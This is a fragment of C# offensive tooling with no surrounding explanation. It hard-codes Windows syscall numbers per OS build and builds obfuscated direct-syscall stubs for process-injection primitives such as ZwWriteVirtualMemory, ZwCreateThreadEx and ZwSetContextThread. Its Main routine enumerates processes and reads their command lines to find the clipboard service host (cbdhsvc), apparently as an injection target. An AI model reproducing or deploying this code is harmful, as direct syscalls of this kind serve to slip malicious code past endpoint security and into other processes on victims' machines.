											if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
											// ZwResumeThread
											if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwWaitForSingleObject
											if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwSetContextThread
											if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x185); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
											// ZwGetContextThread
											if (sysType == 12) { syscall[4] = 238; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwClose
											if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwOpenProcessToken
											if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x121); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
											// ZwSuspendThread
											if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1B6); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
											// ZwProtectVirtualMemory
											if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwCreateProcessEx
											if (sysType == 17) { syscall[4] = 78; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// NtCreateSection
											if (sysType == 18) { syscall[4] = 75; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// NtMapViewOfSection
											if (sysType == 19) { syscall[4] = 41; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwGetNextProcess
											if (sysType == 21) { syscall[4] = 241; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwQuerySystemInformation
											if (sysType == 22) { syscall[4] = 55; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
								} else

									if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17763)) // 1809
									{
											// ZwOpenProcess
											if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwCreateThreadEx
											if (sysType == 2) { syscall[4] = 189; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwWriteVirtualMemory
											if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwAllocateVirtualMemory
											if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwCreateSection
											if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwMapViewOfSection
											if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwCreateProcess
											if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwOpenThread
											if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
											// ZwResumeThread
											if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwWaitForSingleObject
											if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwSetContextThread
											if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x184); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
											// ZwGetContextThread
											if (sysType == 12) { syscall[4] = 237; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwClose
											if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwOpenProcessToken
											if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x122); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
											// ZwSuspendThread
											if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1B5); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
											// ZwProtectVirtualMemory
											if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwCreateProcessEx
											if (sysType == 17) { syscall[4] = 78; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// NtCreateSection
											if (sysType == 18) { syscall[4] = 75; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// NtMapViewOfSection
											if (sysType == 19) { syscall[4] = 41; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwGetNextProcess
											if (sysType == 21) { syscall[4] = 242; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
											// ZwQuerySystemInformation
											if (sysType == 22) { syscall[4] = 55; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
									} // 1809

									return syscall;
		}

		public static int Zeta()
		{
				Random number = new Random();
				int code = number.Next(100);
				int a, b;
				while ( code != 32)
				{
						code = number.Next(100);
				}
				a = code;
				code = number.Next(100);
				while ( code != 32)
				{
						code = number.Next(100);
				}
				b = code;
				return a + b;
		}

    public static void Main()
    {
			  OSVERSIONINFOEXW osVersionInfo = new OSVERSIONINFOEXW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEXW)) };
			  RtlGetVersion(ref osVersionInfo);
				ulong Flags = 0;
				IntPtr ProcessHandle = IntPtr.Zero;
				for (int i = 0; i <= 1000; i++ ) // make sure we don't loop forever
				{
						ZwGetNextProcess( ProcessHandle, ACCESS_MASK.GENERIC_ALL, HandleFlags.None, Flags, out ProcessHandle, ref osVersionInfo );
						try
						{
									PROCESS_BASIC_INFORMATION PBI = new PROCESS_BASIC_INFORMATION();
									int ReturnLength = 0;
									ZwQueryInformationProcess( ProcessHandle, PROCESS_INFORMATION_CLASS.ProcessBasicInformation, out PBI, Marshal.SizeOf( PBI ), out ReturnLength, ref osVersionInfo );
									long PEBaddress = PBI.PebBaseAddress.ToInt64();
      						IntPtr PtrToStructure = new IntPtr();
									UInt32 NumberOfBytesRead = 0;
									UInt32 NumberOfBytesToRead = (UInt32)Marshal.SizeOf( PtrToStructure );
									ZwReadVirtualMemory( ProcessHandle, new IntPtr(PEBaddress + 0x20), out PtrToStructure, NumberOfBytesToRead, ref NumberOfBytesRead, ref osVersionInfo );
      						UNICODE_STRING UnicodeStringCommandLine = new UNICODE_STRING();
									ZwReadVirtualMemoryA( ProcessHandle, new IntPtr((long)PtrToStructure + 0x70), out UnicodeStringCommandLine, new IntPtr(Marshal.SizeOf(UnicodeStringCommandLine)), IntPtr.Zero, ref osVersionInfo );
									string StringCommandLine = new string('\0', UnicodeStringCommandLine.Length / 2);
									ZwReadVirtualMemoryB( ProcessHandle, (IntPtr)UnicodeStringCommandLine.Buffer, StringCommandLine, new IntPtr(UnicodeStringCommandLine.Length), IntPtr.Zero, ref osVersionInfo );
									string arg1 = "svchost.exe";
									string arg2 = "ClipboardSvcGroup";
									string arg3 = "cbdhsvc";
									//Console.WriteLine( "Process: {0} UniqueProcessId: {1}", StringCommandLine, PBI.UniqueProcessId );
									if (StringCommandLine.Contains(arg1) & StringCommandLine.Contains(arg2) & StringCommandLine.Contains(arg3))
									{
										  Console.WriteLine( "Process: {0} UniqueProcessId: {1}", StringCommandLine, PBI.UniqueProcessId );
											break;
									}

						}
						catch (Exception e)
						{
								Console.WriteLine( "ERROR status: {0}", e );
						}
				}
		}
}
